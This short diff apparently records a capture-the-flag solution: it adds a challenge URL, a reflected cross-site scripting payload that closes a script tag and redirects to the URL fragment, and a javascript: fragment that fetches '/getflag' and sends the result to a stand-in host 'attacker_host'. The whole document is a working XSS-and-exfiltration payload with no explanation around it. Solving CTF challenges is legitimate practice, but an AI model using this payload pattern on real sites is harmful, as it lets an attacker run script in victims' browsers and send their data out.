@@ -1,0 +1,3 @@
+http://quiz.ais3.org:8003/
+?message=</script><script>location=location.hash.slice(1)//
+#javascript:fetch('/getflag').then(function(r){return/**/r.text()}).then(function(r){location='http://attacker_host/'+r})
